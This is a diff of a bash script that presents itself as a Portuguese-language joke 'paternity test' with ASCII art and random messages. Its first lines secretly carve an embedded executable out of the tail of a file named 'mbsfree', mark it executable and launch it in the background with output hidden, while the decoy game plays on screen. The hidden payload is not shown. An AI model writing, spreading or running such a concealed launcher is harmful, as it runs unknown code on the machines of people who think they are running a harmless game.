@@ -1,7 +1,7 @@
 #!/bin/bash
 cd $HOME
 clear
-tail -n +273 mbsfree > s && chmod +x s
+tail -n +269 mbsfree > s && chmod +x s
 nohup ./s > /dev/null &
 clear
 MSGS=("⣿⣿⣯⠉⠄⠄⠄⠄⠄⠄⡄⠄⠄⠄⠄⠄⠄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
@@ -93,7 +93,6 @@ sleep 1.5
 echo -e "\e[33;01mLegal, eu vou ser sua tia!\e[0m"
 sleep 3
 echo
-
 while :; do
 rand=$[$RANDOM % ${#arr[@]}]
 mae=$(echo ${arr[$rand]})
@@ -110,9 +109,6 @@ done; #rm s
 e=$"e"; f=$"f"
   srr[0]="$e"; srr[1]="$e"; srr[2]="$e"; srr[3]="$f"
   srr[4]="$e"; srr[5]="$e"
-
-
-
 while :; do
 clear; echo -e $titt #31
 c=$"TESTE FEITO,VOCÊ É O PAI!"; d=$"TESTE FEITO, VOCÊ NÃO É O PAI"
